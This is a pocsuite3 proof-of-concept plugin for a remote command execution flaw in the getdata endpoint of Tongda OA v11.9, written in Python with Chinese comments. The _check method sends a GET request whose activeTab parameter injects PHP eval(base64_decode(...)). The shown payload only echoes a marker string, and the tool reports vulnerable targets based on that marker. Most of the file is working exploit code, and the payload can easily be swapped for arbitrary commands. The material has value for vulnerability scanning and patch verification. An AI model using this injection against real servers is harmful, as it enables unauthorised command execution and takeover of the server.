from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class TDOArcePOC(POCBase):
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-10-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-10-17"  # 编写 PoC 的日期
    updateDate = "2022-10-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源,0day不用写
    name = " 通达OA   rce 远程命令PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "v11.9"  # 漏洞应用名称
    appVersion = "v11.9"  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               通达OA v11.9 getdata接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限
           """  # 漏洞简要描述
    pocDesc = """
               poc的用法描述
           """  # POC用法描述

    def _check(self):

        full_url = f"{self.url}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
        headers = {"Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}

        result = []
        try:
            response = requests.get(full_url, headers=headers, verify=False, timeout=5, allow_redirects=False)
            print(response.text)

            if response.status_code == 200 and 'vuln_test' in response.text:
                result.append(self.url)
        except Exception:
            pass
        finally:
            return result


    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(TDOArcePOC)